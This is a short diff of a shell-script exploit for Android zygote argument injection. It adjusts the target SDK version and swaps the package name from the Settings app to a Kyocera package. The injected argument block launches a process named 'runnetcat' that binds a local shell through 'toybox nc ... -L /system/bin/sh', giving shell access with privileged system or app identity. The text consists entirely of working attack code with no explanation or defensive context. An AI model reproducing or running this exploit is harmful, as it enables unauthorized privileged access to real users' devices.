@@ -112,7 +112,7 @@ zygote_injection() {
 --setgid=%s
 --runtime-flags=2049
 --mount-external-full
---target-sdk-version=29
+--target-sdk-version=28
 --setgroups=3003
 --nice-name=runnetcat
 --seinfo=platform:isSystemServer:privapp:targetSdkVersion=28:complete
@@ -120,7 +120,7 @@ zygote_injection() {
 toybox nc -s 127.0.0.1 -p %s -L /system/bin/sh -l;
 --instruction-set=arm
 --app-data-dir=/data/
---package-name=com.android.settings
+--package-name=jp.kyocera.kdfs
 android.app.ActivityThread
 "\n' "$uid" "$uid" "$NC_PORT"
 }
